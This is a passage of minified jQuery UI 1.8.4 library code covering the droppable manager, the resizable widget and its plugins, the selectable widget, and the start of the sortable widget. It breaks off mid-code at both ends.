a.element)){this.isout=1;this.isover=0;this._deactivate.call(this,b)}}});return c},drag:function(a,b){a.options.refreshPositions&&d.ui.ddmanager.prepareOffsets(a,b);d.each(d.ui.ddmanager.droppables[a.options.scope]||[],function(){if(!(this.options.disabled||this.greedyChild||!this.visible)){var c=d.ui.intersect(a,this,this.options.tolerance);if(c=!c&&this.isover==1?"isout":c&&this.isover==0?"isover":null){var e;if(this.options.greedy){var g=this.element.parents(":data(droppable):eq(0)");if(g.length){e=
d.data(g[0],"droppable");e.greedyChild=c=="isover"?1:0}}if(e&&c=="isover"){e.isover=0;e.isout=1;e._out.call(e,b)}this[c]=1;this[c=="isout"?"isover":"isout"]=0;this[c=="isover"?"_over":"_out"].call(this,b);if(e&&c=="isout"){e.isout=0;e.isover=1;e._over.call(e,b)}}}})}}})(jQuery);
(function(e){e.widget("ui.resizable",e.ui.mouse,{widgetEventPrefix:"resize",options:{alsoResize:false,animate:false,animateDuration:"slow",animateEasing:"swing",aspectRatio:false,autoHide:false,containment:false,ghost:false,grid:false,handles:"e,s,se",helper:false,maxHeight:null,maxWidth:null,minHeight:10,minWidth:10,zIndex:1E3},_create:function(){var b=this,a=this.options;this.element.addClass("ui-resizable");e.extend(this,{_aspectRatio:!!a.aspectRatio,aspectRatio:a.aspectRatio,originalElement:this.element,
_proportionallyResizeElements:[],_helper:a.helper||a.ghost||a.animate?a.helper||"ui-resizable-helper":null});if(this.element[0].nodeName.match(/canvas|textarea|input|select|button|img/i)){/relative/.test(this.element.css("position"))&&e.browser.opera&&this.element.css({position:"relative",top:"auto",left:"auto"});this.element.wrap(e('<div class="ui-wrapper" style="overflow: hidden;"></div>').css({position:this.element.css("position"),width:this.element.outerWidth(),height:this.element.outerHeight(),
top:this.element.css("top"),left:this.element.css("left")}));this.element=this.element.parent().data("resizable",this.element.data("resizable"));this.elementIsWrapper=true;this.element.css({marginLeft:this.originalElement.css("marginLeft"),marginTop:this.originalElement.css("marginTop"),marginRight:this.originalElement.css("marginRight"),marginBottom:this.originalElement.css("marginBottom")});this.originalElement.css({marginLeft:0,marginTop:0,marginRight:0,marginBottom:0});this.originalResizeStyle=
this.originalElement.css("resize");this.originalElement.css("resize","none");this._proportionallyResizeElements.push(this.originalElement.css({position:"static",zoom:1,display:"block"}));this.originalElement.css({margin:this.originalElement.css("margin")});this._proportionallyResize()}this.handles=a.handles||(!e(".ui-resizable-handle",this.element).length?"e,s,se":{n:".ui-resizable-n",e:".ui-resizable-e",s:".ui-resizable-s",w:".ui-resizable-w",se:".ui-resizable-se",sw:".ui-resizable-sw",ne:".ui-resizable-ne",
nw:".ui-resizable-nw"});if(this.handles.constructor==String){if(this.handles=="all")this.handles="n,e,s,w,se,sw,ne,nw";var c=this.handles.split(",");this.handles={};for(var d=0;d<c.length;d++){var f=e.trim(c[d]),g=e('<div class="ui-resizable-handle '+("ui-resizable-"+f)+'"></div>');/sw|se|ne|nw/.test(f)&&g.css({zIndex:++a.zIndex});"se"==f&&g.addClass("ui-icon ui-icon-gripsmall-diagonal-se");this.handles[f]=".ui-resizable-"+f;this.element.append(g)}}this._renderAxis=function(h){h=h||this.element;for(var i in this.handles){if(this.handles[i].constructor==
String)this.handles[i]=e(this.handles[i],this.element).show();if(this.elementIsWrapper&&this.originalElement[0].nodeName.match(/textarea|input|select|button/i)){var j=e(this.handles[i],this.element),k=0;k=/sw|ne|nw|se|n|s/.test(i)?j.outerHeight():j.outerWidth();j=["padding",/ne|nw|n/.test(i)?"Top":/se|sw|s/.test(i)?"Bottom":/^e$/.test(i)?"Right":"Left"].join("");h.css(j,k);this._proportionallyResize()}e(this.handles[i])}};this._renderAxis(this.element);this._handles=e(".ui-resizable-handle",this.element).disableSelection();
this._handles.mouseover(function(){if(!b.resizing){if(this.className)var h=this.className.match(/ui-resizable-(se|sw|ne|nw|n|e|s|w)/i);b.axis=h&&h[1]?h[1]:"se"}});if(a.autoHide){this._handles.hide();e(this.element).addClass("ui-resizable-autohide").hover(function(){e(this).removeClass("ui-resizable-autohide");b._handles.show()},function(){if(!b.resizing){e(this).addClass("ui-resizable-autohide");b._handles.hide()}})}this._mouseInit()},destroy:function(){this._mouseDestroy();var b=function(c){e(c).removeClass("ui-resizable ui-resizable-disabled ui-resizable-resizing").removeData("resizable").unbind(".resizable").find(".ui-resizable-handle").remove()};
if(this.elementIsWrapper){b(this.element);var a=this.element;a.after(this.originalElement.css({position:a.css("position"),width:a.outerWidth(),height:a.outerHeight(),top:a.css("top"),left:a.css("left")})).remove()}this.originalElement.css("resize",this.originalResizeStyle);b(this.originalElement);return this},_mouseCapture:function(b){var a=false;for(var c in this.handles)if(e(this.handles[c])[0]==b.target)a=true;return!this.options.disabled&&a},_mouseStart:function(b){var a=this.options,c=this.element.position(),
d=this.element;this.resizing=true;this.documentScroll={top:e(document).scrollTop(),left:e(document).scrollLeft()};if(d.is(".ui-draggable")||/absolute/.test(d.css("position")))d.css({position:"absolute",top:c.top,left:c.left});e.browser.opera&&/relative/.test(d.css("position"))&&d.css({position:"relative",top:"auto",left:"auto"});this._renderProxy();c=m(this.helper.css("left"));var f=m(this.helper.css("top"));if(a.containment){c+=e(a.containment).scrollLeft()||0;f+=e(a.containment).scrollTop()||0}this.offset=
this.helper.offset();this.position={left:c,top:f};this.size=this._helper?{width:d.outerWidth(),height:d.outerHeight()}:{width:d.width(),height:d.height()};this.originalSize=this._helper?{width:d.outerWidth(),height:d.outerHeight()}:{width:d.width(),height:d.height()};this.originalPosition={left:c,top:f};this.sizeDiff={width:d.outerWidth()-d.width(),height:d.outerHeight()-d.height()};this.originalMousePosition={left:b.pageX,top:b.pageY};this.aspectRatio=typeof a.aspectRatio=="number"?a.aspectRatio:
this.originalSize.width/this.originalSize.height||1;a=e(".ui-resizable-"+this.axis).css("cursor");e("body").css("cursor",a=="auto"?this.axis+"-resize":a);d.addClass("ui-resizable-resizing");this._propagate("start",b);return true},_mouseDrag:function(b){var a=this.helper,c=this.originalMousePosition,d=this._change[this.axis];if(!d)return false;c=d.apply(this,[b,b.pageX-c.left||0,b.pageY-c.top||0]);if(this._aspectRatio||b.shiftKey)c=this._updateRatio(c,b);c=this._respectSize(c,b);this._propagate("resize",
b);a.css({top:this.position.top+"px",left:this.position.left+"px",width:this.size.width+"px",height:this.size.height+"px"});!this._helper&&this._proportionallyResizeElements.length&&this._proportionallyResize();this._updateCache(c);this._trigger("resize",b,this.ui());return false},_mouseStop:function(b){this.resizing=false;var a=this.options,c=this;if(this._helper){var d=this._proportionallyResizeElements,f=d.length&&/textarea/i.test(d[0].nodeName);d=f&&e.ui.hasScroll(d[0],"left")?0:c.sizeDiff.height;
f={width:c.size.width-(f?0:c.sizeDiff.width),height:c.size.height-d};d=parseInt(c.element.css("left"),10)+(c.position.left-c.originalPosition.left)||null;var g=parseInt(c.element.css("top"),10)+(c.position.top-c.originalPosition.top)||null;a.animate||this.element.css(e.extend(f,{top:g,left:d}));c.helper.height(c.size.height);c.helper.width(c.size.width);this._helper&&!a.animate&&this._proportionallyResize()}e("body").css("cursor","auto");this.element.removeClass("ui-resizable-resizing");this._propagate("stop",
b);this._helper&&this.helper.remove();return false},_updateCache:function(b){this.offset=this.helper.offset();if(l(b.left))this.position.left=b.left;if(l(b.top))this.position.top=b.top;if(l(b.height))this.size.height=b.height;if(l(b.width))this.size.width=b.width},_updateRatio:function(b){var a=this.position,c=this.size,d=this.axis;if(b.height)b.width=c.height*this.aspectRatio;else if(b.width)b.height=c.width/this.aspectRatio;if(d=="sw"){b.left=a.left+(c.width-b.width);b.top=null}if(d=="nw"){b.top=
a.top+(c.height-b.height);b.left=a.left+(c.width-b.width)}return b},_respectSize:function(b){var a=this.options,c=this.axis,d=l(b.width)&&a.maxWidth&&a.maxWidth<b.width,f=l(b.height)&&a.maxHeight&&a.maxHeight<b.height,g=l(b.width)&&a.minWidth&&a.minWidth>b.width,h=l(b.height)&&a.minHeight&&a.minHeight>b.height;if(g)b.width=a.minWidth;if(h)b.height=a.minHeight;if(d)b.width=a.maxWidth;if(f)b.height=a.maxHeight;var i=this.originalPosition.left+this.originalSize.width,j=this.position.top+this.size.height,
k=/sw|nw|w/.test(c);c=/nw|ne|n/.test(c);if(g&&k)b.left=i-a.minWidth;if(d&&k)b.left=i-a.maxWidth;if(h&&c)b.top=j-a.minHeight;if(f&&c)b.top=j-a.maxHeight;if((a=!b.width&&!b.height)&&!b.left&&b.top)b.top=null;else if(a&&!b.top&&b.left)b.left=null;return b},_proportionallyResize:function(){if(this._proportionallyResizeElements.length)for(var b=this.helper||this.element,a=0;a<this._proportionallyResizeElements.length;a++){var c=this._proportionallyResizeElements[a];if(!this.borderDif){var d=[c.css("borderTopWidth"),
c.css("borderRightWidth"),c.css("borderBottomWidth"),c.css("borderLeftWidth")],f=[c.css("paddingTop"),c.css("paddingRight"),c.css("paddingBottom"),c.css("paddingLeft")];this.borderDif=e.map(d,function(g,h){g=parseInt(g,10)||0;h=parseInt(f[h],10)||0;return g+h})}e.browser.msie&&(e(b).is(":hidden")||e(b).parents(":hidden").length)||c.css({height:b.height()-this.borderDif[0]-this.borderDif[2]||0,width:b.width()-this.borderDif[1]-this.borderDif[3]||0})}},_renderProxy:function(){var b=this.options;this.elementOffset=
this.element.offset();if(this._helper){this.helper=this.helper||e('<div style="overflow:hidden;"></div>');var a=e.browser.msie&&e.browser.version<7,c=a?1:0;a=a?2:-1;this.helper.addClass(this._helper).css({width:this.element.outerWidth()+a,height:this.element.outerHeight()+a,position:"absolute",left:this.elementOffset.left-c+"px",top:this.elementOffset.top-c+"px",zIndex:++b.zIndex});this.helper.appendTo("body").disableSelection()}else this.helper=this.element},_change:{e:function(b,a){return{width:this.originalSize.width+
a}},w:function(b,a){return{left:this.originalPosition.left+a,width:this.originalSize.width-a}},n:function(b,a,c){return{top:this.originalPosition.top+c,height:this.originalSize.height-c}},s:function(b,a,c){return{height:this.originalSize.height+c}},se:function(b,a,c){return e.extend(this._change.s.apply(this,arguments),this._change.e.apply(this,[b,a,c]))},sw:function(b,a,c){return e.extend(this._change.s.apply(this,arguments),this._change.w.apply(this,[b,a,c]))},ne:function(b,a,c){return e.extend(this._change.n.apply(this,
arguments),this._change.e.apply(this,[b,a,c]))},nw:function(b,a,c){return e.extend(this._change.n.apply(this,arguments),this._change.w.apply(this,[b,a,c]))}},_propagate:function(b,a){e.ui.plugin.call(this,b,[a,this.ui()]);b!="resize"&&this._trigger(b,a,this.ui())},plugins:{},ui:function(){return{originalElement:this.originalElement,element:this.element,helper:this.helper,position:this.position,size:this.size,originalSize:this.originalSize,originalPosition:this.originalPosition}}});e.extend(e.ui.resizable,
{version:"1.8.4"});e.ui.plugin.add("resizable","alsoResize",{start:function(){var b=e(this).data("resizable").options,a=function(c){e(c).each(function(){var d=e(this);d.data("resizable-alsoresize",{width:parseInt(d.width(),10),height:parseInt(d.height(),10),left:parseInt(d.css("left"),10),top:parseInt(d.css("top"),10),position:d.css("position")})})};if(typeof b.alsoResize=="object"&&!b.alsoResize.parentNode)if(b.alsoResize.length){b.alsoResize=b.alsoResize[0];a(b.alsoResize)}else e.each(b.alsoResize,
function(c){a(c)});else a(b.alsoResize)},resize:function(b,a){var c=e(this).data("resizable");b=c.options;var d=c.originalSize,f=c.originalPosition,g={height:c.size.height-d.height||0,width:c.size.width-d.width||0,top:c.position.top-f.top||0,left:c.position.left-f.left||0},h=function(i,j){e(i).each(function(){var k=e(this),q=e(this).data("resizable-alsoresize"),p={},r=j&&j.length?j:k.parents(a.originalElement[0]).length?["width","height"]:["width","height","top","left"];e.each(r,function(n,o){if((n=
(q[o]||0)+(g[o]||0))&&n>=0)p[o]=n||null});if(e.browser.opera&&/relative/.test(k.css("position"))){c._revertToRelativePosition=true;k.css({position:"absolute",top:"auto",left:"auto"})}k.css(p)})};typeof b.alsoResize=="object"&&!b.alsoResize.nodeType?e.each(b.alsoResize,function(i,j){h(i,j)}):h(b.alsoResize)},stop:function(){var b=e(this).data("resizable"),a=b.options,c=function(d){e(d).each(function(){var f=e(this);f.css({position:f.data("resizable-alsoresize").position})})};if(b._revertToRelativePosition){b._revertToRelativePosition=
false;typeof a.alsoResize=="object"&&!a.alsoResize.nodeType?e.each(a.alsoResize,function(d){c(d)}):c(a.alsoResize)}e(this).removeData("resizable-alsoresize")}});e.ui.plugin.add("resizable","animate",{stop:function(b){var a=e(this).data("resizable"),c=a.options,d=a._proportionallyResizeElements,f=d.length&&/textarea/i.test(d[0].nodeName),g=f&&e.ui.hasScroll(d[0],"left")?0:a.sizeDiff.height;f={width:a.size.width-(f?0:a.sizeDiff.width),height:a.size.height-g};g=parseInt(a.element.css("left"),10)+(a.position.left-
a.originalPosition.left)||null;var h=parseInt(a.element.css("top"),10)+(a.position.top-a.originalPosition.top)||null;a.element.animate(e.extend(f,h&&g?{top:h,left:g}:{}),{duration:c.animateDuration,easing:c.animateEasing,step:function(){var i={width:parseInt(a.element.css("width"),10),height:parseInt(a.element.css("height"),10),top:parseInt(a.element.css("top"),10),left:parseInt(a.element.css("left"),10)};d&&d.length&&e(d[0]).css({width:i.width,height:i.height});a._updateCache(i);a._propagate("resize",
b)}})}});e.ui.plugin.add("resizable","containment",{start:function(){var b=e(this).data("resizable"),a=b.element,c=b.options.containment;if(a=c instanceof e?c.get(0):/parent/.test(c)?a.parent().get(0):c){b.containerElement=e(a);if(/document/.test(c)||c==document){b.containerOffset={left:0,top:0};b.containerPosition={left:0,top:0};b.parentData={element:e(document),left:0,top:0,width:e(document).width(),height:e(document).height()||document.body.parentNode.scrollHeight}}else{var d=e(a),f=[];e(["Top",
"Right","Left","Bottom"]).each(function(i,j){f[i]=m(d.css("padding"+j))});b.containerOffset=d.offset();b.containerPosition=d.position();b.containerSize={height:d.innerHeight()-f[3],width:d.innerWidth()-f[1]};c=b.containerOffset;var g=b.containerSize.height,h=b.containerSize.width;h=e.ui.hasScroll(a,"left")?a.scrollWidth:h;g=e.ui.hasScroll(a)?a.scrollHeight:g;b.parentData={element:a,left:c.left,top:c.top,width:h,height:g}}}},resize:function(b){var a=e(this).data("resizable"),c=a.options,d=a.containerOffset,
f=a.position;b=a._aspectRatio||b.shiftKey;var g={top:0,left:0},h=a.containerElement;if(h[0]!=document&&/static/.test(h.css("position")))g=d;if(f.left<(a._helper?d.left:0)){a.size.width+=a._helper?a.position.left-d.left:a.position.left-g.left;if(b)a.size.height=a.size.width/c.aspectRatio;a.position.left=c.helper?d.left:0}if(f.top<(a._helper?d.top:0)){a.size.height+=a._helper?a.position.top-d.top:a.position.top;if(b)a.size.width=a.size.height*c.aspectRatio;a.position.top=a._helper?d.top:0}a.offset.left=
a.parentData.left+a.position.left;a.offset.top=a.parentData.top+a.position.top;c=Math.abs((a._helper?a.offset.left-g.left:a.offset.left-g.left)+a.sizeDiff.width);d=Math.abs((a._helper?a.offset.top-g.top:a.offset.top-d.top)+a.sizeDiff.height);f=a.containerElement.get(0)==a.element.parent().get(0);g=/relative|absolute/.test(a.containerElement.css("position"));if(f&&g)c-=a.parentData.left;if(c+a.size.width>=a.parentData.width){a.size.width=a.parentData.width-c;if(b)a.size.height=a.size.width/a.aspectRatio}if(d+
a.size.height>=a.parentData.height){a.size.height=a.parentData.height-d;if(b)a.size.width=a.size.height*a.aspectRatio}},stop:function(){var b=e(this).data("resizable"),a=b.options,c=b.containerOffset,d=b.containerPosition,f=b.containerElement,g=e(b.helper),h=g.offset(),i=g.outerWidth()-b.sizeDiff.width;g=g.outerHeight()-b.sizeDiff.height;b._helper&&!a.animate&&/relative/.test(f.css("position"))&&e(this).css({left:h.left-d.left-c.left,width:i,height:g});b._helper&&!a.animate&&/static/.test(f.css("position"))&&
e(this).css({left:h.left-d.left-c.left,width:i,height:g})}});e.ui.plugin.add("resizable","ghost",{start:function(){var b=e(this).data("resizable"),a=b.options,c=b.size;b.ghost=b.originalElement.clone();b.ghost.css({opacity:0.25,display:"block",position:"relative",height:c.height,width:c.width,margin:0,left:0,top:0}).addClass("ui-resizable-ghost").addClass(typeof a.ghost=="string"?a.ghost:"");b.ghost.appendTo(b.helper)},resize:function(){var b=e(this).data("resizable");b.ghost&&b.ghost.css({position:"relative",
height:b.size.height,width:b.size.width})},stop:function(){var b=e(this).data("resizable");b.ghost&&b.helper&&b.helper.get(0).removeChild(b.ghost.get(0))}});e.ui.plugin.add("resizable","grid",{resize:function(){var b=e(this).data("resizable"),a=b.options,c=b.size,d=b.originalSize,f=b.originalPosition,g=b.axis;a.grid=typeof a.grid=="number"?[a.grid,a.grid]:a.grid;var h=Math.round((c.width-d.width)/(a.grid[0]||1))*(a.grid[0]||1);a=Math.round((c.height-d.height)/(a.grid[1]||1))*(a.grid[1]||1);if(/^(se|s|e)$/.test(g)){b.size.width=
d.width+h;b.size.height=d.height+a}else if(/^(ne)$/.test(g)){b.size.width=d.width+h;b.size.height=d.height+a;b.position.top=f.top-a}else{if(/^(sw)$/.test(g)){b.size.width=d.width+h;b.size.height=d.height+a}else{b.size.width=d.width+h;b.size.height=d.height+a;b.position.top=f.top-a}b.position.left=f.left-h}}});var m=function(b){return parseInt(b,10)||0},l=function(b){return!isNaN(parseInt(b,10))}})(jQuery);
(function(e){e.widget("ui.selectable",e.ui.mouse,{options:{appendTo:"body",autoRefresh:true,distance:0,filter:"*",tolerance:"touch"},_create:function(){var c=this;this.element.addClass("ui-selectable");this.dragged=false;var f;this.refresh=function(){f=e(c.options.filter,c.element[0]);f.each(function(){var d=e(this),b=d.offset();e.data(this,"selectable-item",{element:this,$element:d,left:b.left,top:b.top,right:b.left+d.outerWidth(),bottom:b.top+d.outerHeight(),startselected:false,selected:d.hasClass("ui-selected"),
selecting:d.hasClass("ui-selecting"),unselecting:d.hasClass("ui-unselecting")})})};this.refresh();this.selectees=f.addClass("ui-selectee");this._mouseInit();this.helper=e("<div class='ui-selectable-helper'></div>")},destroy:function(){this.selectees.removeClass("ui-selectee").removeData("selectable-item");this.element.removeClass("ui-selectable ui-selectable-disabled").removeData("selectable").unbind(".selectable");this._mouseDestroy();return this},_mouseStart:function(c){var f=this;this.opos=[c.pageX,
c.pageY];if(!this.options.disabled){var d=this.options;this.selectees=e(d.filter,this.element[0]);this._trigger("start",c);e(d.appendTo).append(this.helper);this.helper.css({left:c.clientX,top:c.clientY,width:0,height:0});d.autoRefresh&&this.refresh();this.selectees.filter(".ui-selected").each(function(){var b=e.data(this,"selectable-item");b.startselected=true;if(!c.metaKey){b.$element.removeClass("ui-selected");b.selected=false;b.$element.addClass("ui-unselecting");b.unselecting=true;f._trigger("unselecting",
c,{unselecting:b.element})}});e(c.target).parents().andSelf().each(function(){var b=e.data(this,"selectable-item");if(b){var g=!c.metaKey||!b.$element.hasClass("ui-selected");b.$element.removeClass(g?"ui-unselecting":"ui-selected").addClass(g?"ui-selecting":"ui-unselecting");b.unselecting=!g;b.selecting=g;(b.selected=g)?f._trigger("selecting",c,{selecting:b.element}):f._trigger("unselecting",c,{unselecting:b.element});return false}})}},_mouseDrag:function(c){var f=this;this.dragged=true;if(!this.options.disabled){var d=
this.options,b=this.opos[0],g=this.opos[1],h=c.pageX,i=c.pageY;if(b>h){var j=h;h=b;b=j}if(g>i){j=i;i=g;g=j}this.helper.css({left:b,top:g,width:h-b,height:i-g});this.selectees.each(function(){var a=e.data(this,"selectable-item");if(!(!a||a.element==f.element[0])){var k=false;if(d.tolerance=="touch")k=!(a.left>h||a.right<b||a.top>i||a.bottom<g);else if(d.tolerance=="fit")k=a.left>b&&a.right<h&&a.top>g&&a.bottom<i;if(k){if(a.selected){a.$element.removeClass("ui-selected");a.selected=false}if(a.unselecting){a.$element.removeClass("ui-unselecting");
a.unselecting=false}if(!a.selecting){a.$element.addClass("ui-selecting");a.selecting=true;f._trigger("selecting",c,{selecting:a.element})}}else{if(a.selecting)if(c.metaKey&&a.startselected){a.$element.removeClass("ui-selecting");a.selecting=false;a.$element.addClass("ui-selected");a.selected=true}else{a.$element.removeClass("ui-selecting");a.selecting=false;if(a.startselected){a.$element.addClass("ui-unselecting");a.unselecting=true}f._trigger("unselecting",c,{unselecting:a.element})}if(a.selected)if(!c.metaKey&&
!a.startselected){a.$element.removeClass("ui-selected");a.selected=false;a.$element.addClass("ui-unselecting");a.unselecting=true;f._trigger("unselecting",c,{unselecting:a.element})}}}});return false}},_mouseStop:function(c){var f=this;this.dragged=false;e(".ui-unselecting",this.element[0]).each(function(){var d=e.data(this,"selectable-item");d.$element.removeClass("ui-unselecting");d.unselecting=false;d.startselected=false;f._trigger("unselected",c,{unselected:d.element})});e(".ui-selecting",this.element[0]).each(function(){var d=
e.data(this,"selectable-item");d.$element.removeClass("ui-selecting").addClass("ui-selected");d.selecting=false;d.selected=true;d.startselected=true;f._trigger("selected",c,{selected:d.element})});this._trigger("stop",c);this.helper.remove();return false}});e.extend(e.ui.selectable,{version:"1.8.4"})})(jQuery);
(function(d){d.widget("ui.sortable",d.ui.mouse,{widgetEventPrefix:"sort",options:{appendTo:"parent",axis:false,connectWith:false,containment:false,cursor:"auto",cursorAt:false,dropOnEmpty:true,forcePlaceholderSize:false,forceHelperSize:false,grid:false,handle:false,helper:"original",items:"> *",opacity:false,placeholder:false,revert:false,scroll:true,scrollSensitivity:20,scrollSpeed:20,scope:"default",tolerance:"intersect",zIndex:1E3},_create:function(){this.containerCache={};this.element.addClass("ui-sortable");
this.refresh();this.floating=this.items.length?/left|right/.test(this.items[0].item.css("float")):false;this.offset=this.element.offset();this._mouseInit()},destroy:function(){this.element.removeClass("ui-sortable ui-sortable-disabled").removeData("sortable").unbind(".sortable");this._mouseDestroy();for(var a=this.items.length-1;a>=0;a--)this.items[a].item.removeData("sortable-item");return this},_setOption:function(a,b){if(a==="disabled"){this.options[a]=b;this.widget()[b?"addClass":"removeClass"]("ui-sortable-disabled")}else d.Widget.prototype._setOption.apply(this,
arguments)},_mouseCapture:function(a,b){if(this.reverting)return false;if(this.options.disabled||this.options.type=="static")return false;this._refreshItems(a);var c=null,e=this;d(a.target).parents().each(function(){if(d.data(this,"sortable-item")==e){c=d(this);return false}});if(d.data(a.target,"sortable-item")==e)c=d(a.target);if(!c)return false;if(this.options.handle&&!b){var f=false;d(this.options.handle,c).find("*").andSelf().each(function(){if(this==a.target)f=true});if(!f)return false}this.currentItem=
c;this._removeCurrentsFromItems();return true},_mouseStart:function(a,b,c){b=this.options;var e=this;this.currentContainer=this;this.refreshPositions();this.helper=this._createHelper(a);this._cacheHelperProportions();this._cacheMargins();this.scrollParent=this.helper.scrollParent();this.offset=this.currentItem.offset();this.offset={top:this.offset.top-this.margins.top,left:this.offset.left-this.margins.left};this.helper.css("position","absolute");this.cssPosition=this.helper.css("position");d.extend(this.offset,
{click:{left:a.pageX-this.offset.left,top:a.pageY-this.offset.top},parent:this._getParentOffset(),relative:this._getRelativeOffset()});this.originalPosition=this._generatePosition(a);this.originalPageX=a.pageX;this.originalPageY=a.pageY;b.cursorAt&&this._adjustOffsetFromHelper(b.cursorAt);this.domPosition={prev:this.currentItem.prev()[0],parent:this.currentItem.parent()[0]};this.helper[0]!=this.currentItem[0]&&this.currentItem.hide();this._createPlaceholder();b.containment&&this._setContainment();
if(b.cursor){if(d("body").css("cursor"))this._storedCursor=d("body").css("cursor");d("body").css("cursor",b.cursor)}if(b.opacity){if(this.helper.css("opacity"))this._storedOpacity=this.helper.css("opacity");this.helper.css("opacity",b.opacity)}if(b.zIndex){if(this.helper.css("zIndex"))this._storedZIndex=this.helper.css("zIndex");this.helper.css("zIndex",b.zIndex)}if(this.scrollParent[0]!=document&&this.scrollParent[0].tagName!="HTML")this.overflowOffset=this.scrollParent.offset();this._trigger("start",
a,this._uiHash());this._preserveHelperProportions||this._cacheHelperProportions();if(!c)for(c=this.containers.length-1;c>=0;c--)this.containers[c]._trigger("activate",a,e._uiHash(this));if(d.ui.ddmanager)d.ui.ddmanager.current=this;d.ui.ddmanager&&!b.dropBehaviour&&d.ui.ddmanager.prepareOffsets(this,a);this.dragging=true;this.helper.addClass("ui-sortable-helper");this._mouseDrag(a);return true},_mouseDrag:function(a){this.position=this._generatePosition(a);this.positionAbs=this._convertPositionTo("absolute");
if(!this.lastPositionAbs)this.lastPositionAbs=this.positionAbs;if(this.options.scroll){var b=this.options,c=false;if(this.scrollParent[0]!=document&&this.scrollParent[0].tagName!="HTML"){if(this.overflowOffset.top+this.scrollParent[0].offsetHeight-a.pageY<b.scrollSensitivity)this.scrollParent[0].scrollTop=c=this.scrollParent[0].scrollTop+b.scrollSpeed;else if(a.pageY-this.overflowOffset.top<b.scrollSensitivity)this.scrollParent[0].scrollTop=c=this.scrollParent[0].scrollTop-b.scrollSpeed;if(this.overflowOffset.left+
this.scrollParent[0].offsetWidth-a.pageX<b.scrollSensitivity)this.scrollParent[0].scrollLeft=c=this.scrollParent[0].scrollLeft+b.scrollSpeed;else if(a.pageX-this.overflowOffset.left<b.scrollSensitivity)this.scrollParent[0].scrollLeft=c=this.scrollParent[0].scrollLeft-b.scrollSpeed}else{if(a.pageY-d(document).scrollTop()<b.scrollSensitivity)c=d(document).scrollTop(d(document).scrollTop()-b.scrollSpeed);else if(d(window).height()-(a.pageY-d(document).scrollTop())<b.scrollSensitivity)c=d(document).scrollTop(d(document).scrollTop()+
b.scrollSpeed);if(a.pageX-d(document).scrollLeft()<b.scrollSensitivity)c=d(document).scrollLeft(d(document).scrollLeft()-b.scrollSpeed);else if(d(window).width()-(a.pageX-d(document).scrollLeft())<b.scrollSensitivity)c=d(document).scrollLeft(d(document).scrollLeft()+b.scrollSpeed)}c!==false&&d.ui.ddmanager&&!b.dropBehaviour&&d.ui.ddmanager.prepareOffsets(this,a)}this.positionAbs=this._convertPositionTo("absolute");if(!this.options.axis||this.options.axis!="y")this.helper[0].style.left=this.position.left+
"px";if(!this.options.axis||this.options.axis!="x")this.helper[0].style.top=this.position.top+"px";for(b=this.items.length-1;b>=0;b--){c=this.items[b];var e=c.item[0],f=this._intersectsWithPointer(c);if(f)if(e!=this.currentItem[0]&&this.placeholder[f==1?"next":"prev"]()[0]!=e&&!d.ui.contains(this.placeholder[0],e)&&(this.options.type=="semi-dynamic"?!d.ui.contains(this.element[0],e):true)){this.direction=f==1?"down":"up";if(this.options.tolerance=="pointer"||this._intersectsWithSides(c))this._rearrange(a,
c);else break;this._trigger("change",a,this._uiHash());break}}this._contactContainers(a);d.ui.ddmanager&&d.ui.ddmanager.drag(this,a);this._trigger("sort",a,this._uiHash());this.lastPositionAbs=this.positionAbs;return false},_mouseStop:function(a,b){if(a){d.ui.ddmanager&&!this.options.dropBehaviour&&d.ui.ddmanager.drop(this,a);if(this.options.revert){var c=this;b=c.placeholder.offset();c.reverting=true;d(this.helper).animate({left:b.left-this.offset.parent.left-c.margins.left+(this.offsetParent[0]==
document.body?0:this.offsetParent[0].scrollLeft),top:b.top-this.offset.parent.top-c.margins.top+(this.offsetParent[0]==document.body?0:this.offsetParent[0].scrollTop)},parseInt(this.options.revert,10)||500,function(){c._clear(a)})}else this._clear(a,b);return false}},cancel:function(){var a=this;if(this.dragging){this._mouseUp();this.options.helper=="original"?this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper"):this.currentItem.show();for(var b=this.containers.length-1;b>=0;b--){this.containers[b]._trigger("deactivate",
null,a._uiHash(this));if(this.containers[b].containerCache.over){this.containers[b]._trigger("out",null,a._uiHash(this));this.containers[b].containerCache.over=0}}}this.placeholder[0].parentNode&&this.placeholder[0].parentNode.removeChild(this.placeholder[0]);this.options.helper!="original"&&this.helper&&this.helper[0].parentNode&&this.helper.remove();d.extend(this,{helper:null,dragging:false,reverting:false,_noFinalSort:null});this.domPosition.prev?d(this.domPosition.prev).after(this.currentItem):
d(this.domPosition.parent).prepend(this.currentItem);return this},serialize:function(a){var b=this._getItemsAsjQuery(a&&a.connected),c=[];a=a||{};d(b).each(function(){var e=(d(a.item||this).attr(a.attribute||"id")||"").match(a.expression||/(.+)[-=_](.+)/);if(e)c.push((a.key||e[1]+"[]")+"="+(a.key&&a.expression?e[1]:e[2]))});!c.length&&a.key&&c.push(a.key+"=");return c.join("&")},toArray:function(a){var b=this._getItemsAsjQuery(a&&a.connected),c=[];a=a||{};b.each(function(){c.push(d(a.item||this).attr(a.attribute||
"id")||"")});return c},_intersectsWith:function(a){var b=this.positionAbs.left,c=b+this.helperProportions.width,e=this.positionAbs.top,f=e+this.helperProportions.height,g=a.left,h=g+a.width,i=a.top,k=i+a.height,j=this.offset.click.top,l=this.offset.click.left;j=e+j>i&&e+j<k&&b+l>g&&b+l<h;return this.options.tolerance=="pointer"||this.options.forcePointerForContainers||this.options.tolerance!="pointer"&&this.helperProportions[this.floating?"width":"height"]>a[this.floating?"width":"height"]?j:g<b+
this.helperProportions.width/2&&c-this.helperProportions.width/2<h&&i<e+this.helperProportions.height/2&&f-this.helperProportions.height/2<k},_intersectsWithPointer:function(a){var b=d.ui.isOverAxis(this.positionAbs.top+this.offset.click.top,a.top,a.height);a=d.ui.isOverAxis(this.positionAbs.left+this.offset.click.left,a.left,a.width);b=b&&a;a=this._getDragVerticalDirection();var c=this._getDragHorizontalDirection();if(!b)return false;return this.floating?c&&c=="right"||a=="down"?2:1:a&&(a=="down"?
2:1)},_intersectsWithSides:function(a){var b=d.ui.isOverAxis(this.positionAbs.top+this.offset.click.top,a.top+a.height/2,a.height);a=d.ui.isOverAxis(this.positionAbs.left+this.offset.click.left,a.left+a.width/2,a.width);var c=this._getDragVerticalDirection(),e=this._getDragHorizontalDirection();return this.floating&&e?e=="right"&&a||e=="left"&&!a:c&&(c=="down"&&b||c=="up"&&!b)},_getDragVerticalDirection:function(){var a=this.positionAbs.top-this.lastPositionAbs.top;return a!=0&&(a>0?"down":"up")},
